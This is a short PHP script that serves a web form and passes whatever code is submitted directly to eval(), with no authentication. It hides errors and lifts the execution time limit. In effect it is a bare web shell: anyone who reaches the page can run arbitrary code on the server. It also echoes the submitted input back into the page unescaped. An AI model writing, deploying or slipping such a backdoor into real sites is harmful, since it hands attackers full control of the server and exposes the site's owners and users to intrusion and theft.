<?php
ini_set('display_errors',false);
ini_set('max_execution_time', 0); 

$isExec = false;
if(isset( $_POST['code'])){
	$code = $_POST['code'];
	$isExec = true;
}

echo '<form method="post">';
echo '<textarea name="code" style="width:100%;height:200px">'.$code.'</textarea><br><br>';
echo '<input type="submit" name="Submit">';
echo '</form>';

if($isExec){
	echo @eval(trim($_POST['code']));
}
?>
